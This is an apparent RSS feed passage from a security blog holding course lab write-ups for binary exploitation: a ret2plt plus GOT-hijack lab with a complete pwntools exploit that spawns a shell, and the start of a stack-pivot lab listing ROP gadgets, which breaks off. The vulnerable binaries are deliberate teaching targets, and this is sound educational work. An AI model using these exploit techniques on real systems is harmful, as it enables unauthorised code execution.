&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)output)[i] &lt;span style="color:#f92672">=&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)flag)[i] &lt;span style="color:#f92672">^&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)pass)[i];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;flag = %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, output);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, _IONBF, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, _IONBF, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/home/chal/flag.txt&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(fd, flag, &lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	close(fd);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/dev/urandom&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(fd, &lt;span style="color:#f92672">&amp;amp;&lt;/span>secret, &lt;span style="color:#66d9ef">sizeof&lt;/span>(secret));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)flag)[i] &lt;span style="color:#f92672">=&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)flag)[i] &lt;span style="color:#f92672">^&lt;/span> secret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;secret = %lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, secret);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	gets(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x34 (2023 Lab - ret2plt)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/</guid><description>&lt;h1 id="simple-pwn-0x34-2023-lab---ret2plt">
 Simple PWN 0x34 (2023 Lab - ret2plt)
 &lt;a class="anchor" href="#simple-pwn-0x34-2023-lab---ret2plt">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Got Hijack / BoF&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//gcc -no-pie -fno-stack-protector -z norelro ret2plt.c -o ret2plt
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Try your best :&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	gets(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;boom !&amp;#34;&lt;/span>);	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>checksec + file
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ checksec chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Arch: amd64-64-little
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RELRO: No RELRO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Stack: No canary found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NX: NX enabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ file chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chal: ELF 64-bit LSB executable, x86-64, version &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>SYSV&lt;span style="color:#f92672">)&lt;/span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID&lt;span style="color:#f92672">[&lt;/span>sha1&lt;span style="color:#f92672">]=&lt;/span>f7ed984819a3908eff455bfcf87716d0fb298fac, &lt;span style="color:#66d9ef">for&lt;/span> GNU/Linux 3.2.0, not stripped
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去&lt;/li>
&lt;li>還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看
流程:&lt;/li>
&lt;li>首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt==
&lt;pre tabindex="0">&lt;code>pop rdi ret
puts got address
puts plt
&lt;/code>&lt;/pre>這三行的意思是把puts的got address，透過puts印出來給我們 -&amp;gt; puts(put自己的got address)&lt;/li>
&lt;li>有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># leak puts got address to calculate libc base address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#f92672">=&lt;/span> u64(r&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">6&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#f92672">=&lt;/span> puts_addr &lt;span style="color:#f92672">-&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_base
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>system_addr &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有&lt;code>/bin/sh&lt;/code>或是&lt;code>/sh&lt;/code>的string，不過我們可以直接用同樣的方法，把字串送進去
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># fetch user input -&amp;gt; /bin/sh\x00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_plt,
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>此時他就會像使用者要輸入，並把我們的輸入丟到bss address&lt;/li>
&lt;li>另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking==
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># fetch user input -&amp;gt; system address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_got
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_plt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address&lt;/li>
&lt;li>所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># system(&amp;#39;/bin/sh\x00&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_plt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="exploit---ret2pltleak-base-address--got-hijackcall-system">
 Exploit - Ret2Plt(leak base address) + Got Hijack(call system)
 &lt;a class="anchor" href="#exploit---ret2pltleak-base-address--got-hijackcall-system">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./chal&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># r = remote(&amp;#39;10.113.184.121&amp;#39;, 10053)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;/lib/x86_64-linux-gnu/libc.so.6&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401263&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_got &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x403368&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_plt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x401070&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_got &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x403378&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_plt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x401090&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x403f00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># leak puts got address to calculate libc base address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, puts_got,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts_plt,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fetch user input -&amp;gt; /bin/sh\x00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, bss_addr,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gets_plt,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fetch user input -&amp;gt; system address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, puts_got,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gets_plt,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># system(&amp;#39;/bin/sh\x00&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, bss_addr,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts_plt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>raw_input()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Try your best :&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span> &lt;span style="color:#f92672">+&lt;/span> payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(r&lt;span style="color:#f92672">.&lt;/span>recvline())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#f92672">=&lt;/span> u64(r&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">6&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;puts address = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>hex(puts_addr)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#f92672">=&lt;/span> puts_addr &lt;span style="color:#f92672">-&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_base
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>system_addr &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;system address = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>hex(system_addr)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/bin/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>raw_input()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(p64(libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Simple PWN 0x35(2023 Lab - Stack Pivot)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/</guid><description>&lt;h1 id="simple-pwn-0x352023-lab---stack-pivot">
 Simple PWN 0x35(2023 Lab - Stack Pivot)
 &lt;a class="anchor" href="#simple-pwn-0x352023-lab---stack-pivot">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/rylybxgji">Simple PWN - 0x09(stack pivoting)&lt;/a>
&lt;a href="https://hackmd.io/@SBK6401/H1NX6Bloj">Simple PWN - 0x10(seccomp/Lab - rop2win)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x80&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall&lt;/p>
&lt;ol>
&lt;li>checksec + file
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ checksec chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Arch: amd64-64-little
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RELRO: Partial RELRO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Stack: Canary found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NX: NX enabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ file chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chal: ELF 64-bit LSB executable, x86-64, version &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>GNU/Linux&lt;span style="color:#f92672">)&lt;/span>, statically linked, BuildID&lt;span style="color:#f92672">[&lt;/span>sha1&lt;span style="color:#f92672">]=&lt;/span>26fa8e6daa97baf7a26596ea91af5703dd932327, &lt;span style="color:#66d9ef">for&lt;/span> GNU/Linux 3.2.0, not stripped
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫&lt;/li>
&lt;li>找gadget
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>leave_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401cfc&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401832&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rsi_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040f01e&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rax_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000448d27&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdx_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040173f&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>syscall_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000448280&lt;/span>
